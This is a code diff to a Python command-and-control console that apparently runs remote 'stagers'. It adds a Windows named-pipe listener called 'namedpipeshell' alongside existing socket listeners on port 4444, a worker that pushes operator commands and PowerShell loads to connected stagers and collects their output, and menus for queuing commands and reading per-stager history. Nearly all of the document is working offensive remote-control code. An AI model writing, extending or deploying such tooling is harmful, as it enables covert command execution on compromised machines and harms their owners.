@@ -4,6 +4,9 @@ import threading
 import queue
 import uuid 
 import os
+import time
+
+import win32pipe, win32file, pywintypes
 
 #from os.path import isfile, join
 
@@ -32,13 +35,18 @@ class myconstant():
         self.TAG_LISTENER = "[Listener]"
         #self.TAG_STAGER = "[Stager]"
         self.TAG_INTE_STAGER = "[Interact]"
+        self.TAG_PIPE_LISTENER = "[Pipe Listener]"
+        self.TAG_PIPE_INTE_STAGER = "[Pipe Interact]"
+
 
         self.CMD_USELISTENER = "uselistener"
         #self.CMD_USESTAGER = "userstager"
         self.CMD_INTERACTSTAGER = "stager"
+        self.CMD_PIPE_INTERACTSTAGER = "pstager"
+        self.CMD_USEPIPELISTENER = "usepipelistener"
         self.CMD_HELP = "help"
         self.CMD_EXIT = "exit"
-        self.CMD_AUTOLIST = [self.CMD_USELISTENER,self.CMD_INTERACTSTAGER,self.CMD_HELP,self.CMD_EXIT]
+        self.CMD_AUTOLIST = [self.CMD_USEPIPELISTENER,self.CMD_USELISTENER,self.CMD_INTERACTSTAGER,self.CMD_HELP,self.CMD_EXIT,self.CMD_PIPE_INTERACTSTAGER]
 
         self.CMD_BACK = "back"
         self.CMD_LISTENER_GETINFO = "info"
@@ -60,8 +68,20 @@ class myconstant():
         self.CMD_STAGER_AUTOLIST = [self.CMD_BACK,self.CMD_STAGER_GET_LIST,self.CMD_STAGER_GET_INTO,
                                     self.CMD_STAGER_GET_HISTORY,self.CMD_HELP,self.CMD_STAGER_LOAD_PS,self.CMD_STAGER_CON]
 
-
-
+        self.CMD_PIPE_LISTENER_GETINFO = "info"
+        self.CMD_PIPE_LISTENER_SETPIPENAME = "setpipename"
+        self.CMD_PIPE_LISTENER_START = "start"
+        self.CMD_PIPE_LISTENER_LIST = "list"
+        self.CMD_PIPE_LISTENER_STOP = "stop"
+        self.CMD_PIPE_LISTENER_AUTOLIST = [self.CMD_PIPE_LISTENER_GETINFO,self.CMD_PIPE_LISTENER_SETPIPENAME,self.CMD_PIPE_LISTENER_START,
+                                            self.CMD_PIPE_LISTENER_LIST,self.CMD_PIPE_LISTENER_STOP,self.CMD_BACK]
+        
+        self.CMD_PIPE_STAGER_GET_LIST = "list"
+        self.CMD_PIPE_STAGER_GET_INTO = "into"
+        self.CMD_PIPE_STAGER_GET_HISTORY = "history"
+        self.CMD_PIPE_SAGER_AUTOLIST = [self.CMD_PIPE_STAGER_GET_LIST,self.CMD_PIPE_STAGER_GET_INTO,self.CMD_PIPE_STAGER_GET_HISTORY,self.CMD_BACK]
+        #self.CMD_PIPE_STAGER_LOAD_PS = "psload"
+        #self.CMD_PIPE_STAGER_CON = "connect" 
 
 
 class myconstant_networking(): #applicaiton layer tag
@@ -91,6 +111,35 @@ class ps_loader():
         with open(self.DBPATH + filename,mode='r') as f:
             all_of_it = f.read()
             return all_of_it
+
+
+
+# socket is assume connected
+class mypipe_handler():
+    def __init__(self,mypipe):
+        self.__mypipe = mypipe
+        self.__msg_buf = ""
+        
+        self.__msg_tag_st = "[MYMSST]"
+        self.__msg_tag_ed = "[MYMSED]"
+        #less likely need this
+        self.__enc_tag_st = "[MYENST]"
+        self.__enc_tag_ed = "[MYENED]"
+
+    def msf_encode(self,msg):
+        return msg #no encode for now ...
+        #return self.__msg_tag_st + msg + self.__msg_tag_ed
+
+
+    def get_nextmsg(self):
+        while True:
+            try:
+                resp = win32file.ReadFile(self.__mypipe, 1024)
+                break
+            except Exception as e:
+                if e.args[0] == 232:
+                    pass
+        return resp[1].decode("ascii", "ignore")
 
 
 # socket is assume connected
@@ -139,8 +188,8 @@ class myserver():
 
     def __init__(self):
         self.__mysocket_list = dict()
-        self.__mydata_list = dict()
-        self.__myaddr_list = dict()
+        self.__mydata_list = dict() #Que to runner
+        self.__myaddr_list = dict() #this is port + ip
         self.__mymsg_list = dict()
         self.__myuuid_list = list()
         self.__mystart_list = dict() #bool
@@ -153,6 +202,20 @@ class myserver():
 
         self.__hostname = "192.168.182.131"
         self.__port = 4444
+
+        self.__pipename = "namedpipeshell"
+
+        self.__mypipelistener_start_list = dict() #bool
+        self.__mypipelistener_pipename_list = dict()
+        self.__mypipelistener_pipe_list = dict()
+        self.__mypipelistener_uuid_list = list()
+        
+        self.__mypipe_myhandle_list = dict()
+        self.__mypipe_mydata_list = dict() #Que to runner
+        self.__mypipe_mypipename_list = dict()
+        self.__mypipe_mymsg_list = dict()
+        self.__mypipe_myuuid_list = list()
+        self.__mypipe_mystart_list = dict() #bool
 
 
     def start_worker(self,myuuid):
@@ -214,6 +277,60 @@ class myserver():
                 myhistory.append("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
                 break
 
+    def start_pipworker(self,myuuid):
+        t_net_constant = myconstant_networking()
+        print("[Stager] This is the pipe worker for myuuid: {}".format(myuuid))
+        while True:
+            # This will be the main runner
+            item_que = self.__mypipe_mydata_list[myuuid]
+            mypipe = self.__mypipe_myhandle_list[myuuid]
+            myhistory = self.__mypipe_mymsg_list[myuuid]
+
+            t_mypipehandler = mypipe_handler(mypipe)
+
+            try:
+                cmd_struct_to_send = item_que.get(block=True, timeout=5)
+            except queue.Empty:
+                #print("[DEBUG] Job Que for {} is empty".format(myuuid))
+                continue
+            
+            try:
+                myhistory.append("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
+                if (cmd_struct_to_send[0] == "psload"):
+                    cmd_struct_to_send[0] = "ps"
+                    myhistory.append("[Stager] Command_tag: {}".format(cmd_struct_to_send[0]))
+                else:
+                    myhistory.append("[Stager] Command_tag: {}  Command: {}".format(cmd_struct_to_send[0],cmd_struct_to_send[1]))
+                
+                encode_tag = t_mypipehandler.msf_encode(cmd_struct_to_send[0]).encode("ascii", "ignore")
+                win32file.WriteFile(mypipe, encode_tag)
+                recv_result = t_mypipehandler.get_nextmsg()
+                myhistory.append("[Stager] Send command_tag result: {}".format(recv_result))
+
+                encode_cmd = t_mypipehandler.msf_encode(cmd_struct_to_send[1]).encode("ascii", "ignore")
+                win32file.WriteFile(mypipe, encode_cmd)
+                recv_result = t_mypipehandler.get_nextmsg()
+                myhistory.append("[Stager] Send command result: {}".format(recv_result))
+
+                # try get cmd result if any
+                recv_result = t_mypipehandler.get_nextmsg()
+                myhistory.append("[Stager] Run Command result: {}".format(recv_result))
+                # ack for success
+                encode_cmd = t_mypipehandler.msf_encode(t_net_constant.PSRUN_SUCCESS).encode("ascii", "ignore")
+                win32file.WriteFile(mypipe, encode_cmd)
+                #myhistory.append("[DEBUG] PSRUN_SUCCESS sent")
+                myhistory.append("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
+
+            except Exception as e:
+                print("Exception: " + str(e))
+                myhistory.append("Exception: " + str(e))
+                #remove from worker list
+                self.__mypipe_mydata_list.pop(myuuid, None)
+                self.__mypipe_mypipename_list.pop(myuuid, None)
+                myhistory.append("[Stager] {} is stoped ...".format(myuuid))
+                myhistory.append("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
+                break
+
     
     def start_client(self,conhost,conport):
         print("Trying to connect to Host: {} and Port: {}".format(conhost,conport))
@@ -242,8 +359,6 @@ class myserver():
         self.__mystart_list[myuuid] = True
         print("[Client] myuuid is {}".format(myuuid))
         threading.Thread(target=self.start_worker,args=(myuuid,)).start()
-
-
 
 
     def start_listener(self):
@@ -295,26 +410,108 @@ class myserver():
         print("[Listener] {} is stoped ...".format(listeneruuid))
 
 
+    def start_pipe_listener(self):
+        print("[Listener] pipe server started on namepipe {}".format(self.__pipename))
+        mypipeuuid = uuid.uuid4().hex[:6].upper() #listener
+        pipe = win32pipe.CreateNamedPipe(r'\\.\pipe\\' + self.__pipename, win32pipe.PIPE_ACCESS_DUPLEX, win32pipe.PIPE_TYPE_MESSAGE | win32pipe.PIPE_READMODE_MESSAGE | win32pipe.PIPE_NOWAIT, 1, 65536, 65536, 0, None)
+        self.__mypipelistener_pipe_list[mypipeuuid] = pipe
+        self.__mypipelistener_pipename_list[mypipeuuid] = self.__pipename
+        self.__mypipelistener_uuid_list.append(mypipeuuid)
+        self.__mypipelistener_start_list[mypipeuuid] = True
+        
+        print("[Listener] waiting for client")
+        while self.__mypipelistener_start_list[mypipeuuid]:
+            
+            try:
+                win32pipe.ConnectNamedPipe(self.__mypipelistener_pipe_list[mypipeuuid], None)
+                print("[Listener] got client")
+
+                myuuid = uuid.uuid4().hex[:6].upper() #stager
+                #create fifo
+                self.__mypipe_mydata_list[myuuid] = queue.Queue()
+                #create history
+                self.__mypipe_mymsg_list[myuuid] = list()
+                #push uuid
+                self.__mypipe_myuuid_list.append(myuuid)
+                #set start
+                self.__mypipe_mystart_list[myuuid] = True
+                #pipe name
+                self.__mypipe_mypipename_list[myuuid] = self.__pipename
+                
+                
+                print("[Listener] myuuid is {}".format(myuuid))
+                threading.Thread(target=self.start_pipworker,args=(myuuid,)).start()
+                
+                #swap pipe
+                self.__mypipe_myhandle_list[myuuid] = self.__mypipelistener_pipe_list[mypipeuuid]
+                newpipe = win32pipe.CreateNamedPipe(r'\\.\pipe\\' + self.__pipename, win32pipe.PIPE_ACCESS_DUPLEX, win32pipe.PIPE_TYPE_MESSAGE | win32pipe.PIPE_READMODE_MESSAGE | win32pipe.PIPE_NOWAIT, 1, 65536, 65536, 0, None)
+                self.__mypipelistener_pipe_list[mypipeuuid] = newpipe
+
+                
+            except Exception as e:
+                if (e.args[0] == 536): #notstarted or busy
+                    pass
+                    #print("Wait a bit longer ... ")
+                elif (e.args[0] == 231):
+                    while True:
+                        try:
+                            #swap pipe
+                            self.__mypipe_myhandle_list[myuuid] = self.__mypipelistener_pipe_list[mypipeuuid]
+                            newpipe = win32pipe.CreateNamedPipe(r'\\.\pipe\\' + self.__pipename, win32pipe.PIPE_ACCESS_DUPLEX, win32pipe.PIPE_TYPE_MESSAGE | win32pipe.PIPE_READMODE_MESSAGE | win32pipe.PIPE_NOWAIT, 1, 65536, 65536, 0, None)
+                            self.__mypipelistener_pipe_list[mypipeuuid] = newpipe
+                            break
+                        except Exception as inner_e:
+                            if (inner_e.args[0] == 231):
+                                #print("Wait a bit longer ... ")
+                                time.sleep(5)
+
+                else:
+                    print("Error: {}".format(str(e)))
+                time.sleep(5)
+
+        #end of while loop
+        #dummy for now
+        win32file.CloseHandle(pipe)
+        
+
+
     def create_command(self,stager,tag,command):
         self.__mydata_list[stager].put([tag,command])
+    
+    def create_pipe_command(self,stager,tag,command):
+        self.__mypipe_mydata_list[stager].put([tag,command])
     
     def stop_listener(self,listener):
         self.__mylistener_start_list[listener] = False
 
     def print_info(self):
-        print("======Listener Info=========")
+        print("++++++++++++++++++++++++Listener Info++++++++++++++++++++++++")
         print("Listener Type: socket")
         print("Hostname: {}".format(self.__hostname))
         print("Port Number: {}".format(self.__port))
     
+    def print_pipe_info(self):
+        print("+++++++++++++++++++++Pipe Listener Info++++++++++++++++++++++")
+        print("Listener Type: pipe")
+        print("Pipe Name: {}".format(self.__pipename))
+
+    
     def print_stager(self):
         print("List of avaliable stager: {}".format(self.__myuuid_list))
+    
+    def print_pipe_stager(self):
+        print("List of avaliable pipe stager: {}".format(self.__mypipe_myuuid_list))
+
     
     def print_listener(self):
         print("List of avaliable listener: {}".format(self.__mylistener_uuid_list))
 
     def get_stager(self):
         return self.__myuuid_list
+    
+    def get_pipe_stager(self):
+        return self.__mypipe_myuuid_list
+
     def get_listener(self):
         return self.__mylistener_uuid_list
 
@@ -323,6 +520,9 @@ class myserver():
 
     def get_history(self):
         return self.__mymsg_list
+    
+    def get_pipe_history(self):
+        return self.__mypipe_mymsg_list
 
     def set_hostname(self,hostname):
         assert(type(hostname) is str)
@@ -342,7 +542,8 @@ class mymainclass():
     def __cmd_list_main(self):
         print("\n+++++++++++++++++++++++++++++++++++")
         print(self.__t_myconstant.CMD_USELISTENER + ": Go to listener settings")
-        #print(self.__t_myconstant.CMD_USESTAGER + ": Go to stager setting")
+        print(self.__t_myconstant.CMD_USEPIPELISTENER + ": Go to pipe listener setting")
+        print(self.__t_myconstant.CMD_PIPE_INTERACTSTAGER + ": Interact with pipe stager")
         print(self.__t_myconstant.CMD_INTERACTSTAGER + ": Interact with live stager")
         print(self.__t_myconstant.CMD_HELP + ": Print cmd list and help message")
         print(self.__t_myconstant.CMD_EXIT + ": Exit the app")
@@ -388,6 +589,10 @@ class mymainclass():
                 setautocomplete(self.__t_myconstant.CMD_LISTENER_AUTOLIST)
             if cmd_tag == self.__t_myconstant.TAG_INTE_STAGER:
                 setautocomplete(self.__t_myconstant.CMD_STAGER_AUTOLIST)
+            if cmd_tag == self.__t_myconstant.TAG_PIPE_LISTENER:
+                setautocomplete(self.__t_myconstant.CMD_PIPE_LISTENER_AUTOLIST)
+            if cmd_tag == self.__t_myconstant.TAG_PIPE_INTE_STAGER:
+                setautocomplete(self.__t_myconstant.CMD_PIPE_SAGER_AUTOLIST)
             
 
             user_input = input(cmd_tag + "> ")
@@ -400,9 +605,13 @@ class mymainclass():
                     cmd_tag = self.__t_myconstant.TAG_LISTENER
                     continue
 
-                # if command_id == self.__t_myconstant.CMD_USESTAGER:
-                #     cmd_tag = self.__t_myconstant.TAG_STAGER
-                #     continue
+                if command_id == self.__t_myconstant.CMD_USEPIPELISTENER:
+                    cmd_tag = self.__t_myconstant.TAG_PIPE_LISTENER
+                    continue
+
+                if command_id == self.__t_myconstant.CMD_PIPE_INTERACTSTAGER:
+                    cmd_tag = self.__t_myconstant.TAG_PIPE_INTE_STAGER
+                    continue
                 
                 if command_id == self.__t_myconstant.CMD_INTERACTSTAGER:
                     cmd_tag = self.__t_myconstant.TAG_INTE_STAGER
@@ -533,6 +742,55 @@ class mymainclass():
                     user_input_host = input("Please enter hostname or ip: ")
                     user_input_port = input("Please enter portnumber: ")
                     self.__t_myserver.start_client(user_input_host,int(user_input_port))
+            #next cmd
+
+            if cmd_tag == self.__t_myconstant.TAG_PIPE_LISTENER:
+                # menu switch
+                if command_id == self.__t_myconstant.CMD_BACK:
+                    cmd_tag = self.__t_myconstant.TAG_MYCS
+                    continue
+                if command_id == self.__t_myconstant.CMD_PIPE_LISTENER_GETINFO:
+                    self.__t_myserver.print_pipe_info()
+                    continue
+                if command_id == self.__t_myconstant.CMD_PIPE_LISTENER_START:
+                    threading.Thread(target=self.__t_myserver.start_pipe_listener).start()
+                    continue
+            
+            if cmd_tag == self.__t_myconstant.TAG_PIPE_INTE_STAGER:
+                #menu switch
+                if command_id == self.__t_myconstant.CMD_BACK:
+                    cmd_tag = self.__t_myconstant.TAG_MYCS
+                    continue
+                if command_id == self.__t_myconstant.CMD_PIPE_STAGER_GET_LIST:
+                    self.__t_myserver.print_pipe_stager()
+                    continue
+                if command_id == self.__t_myconstant.CMD_PIPE_STAGER_GET_INTO:
+                    #set auto compete to stager uuid
+                    setautocomplete(self.__t_myserver.get_pipe_stager())
+
+                    user_input_stager = input("Please enter the stager uuid: ")
+                    if user_input_stager not in self.__t_myserver.get_pipe_stager():
+                        print("Please input a valid stager uuid")
+                        continue
+
+                    #unset auto complete
+                    removecomplete()
+                    user_input_command_tag = input("Please enter the command tag: ")
+                    user_input_command = input("Please enter the command: ")
+                    self.__t_myserver.create_pipe_command(user_input_stager,user_input_command_tag,user_input_command)
+                    continue
+                if command_id == self.__t_myconstant.CMD_PIPE_STAGER_GET_HISTORY:
+                    #set auto compete to stager uuid
+                    setautocomplete(self.__t_myserver.get_pipe_stager())
+
+                    user_input_stager = input("Please enter the stager uuid: ")
+                    if user_input_stager not in self.__t_myserver.get_pipe_stager():
+                        print("Please input a valid stager uuid")
+                        continue
+                    for each_msg in self.__t_myserver.get_pipe_history()[user_input_stager]:
+                        print(each_msg)
+                    continue
+
 
 
 
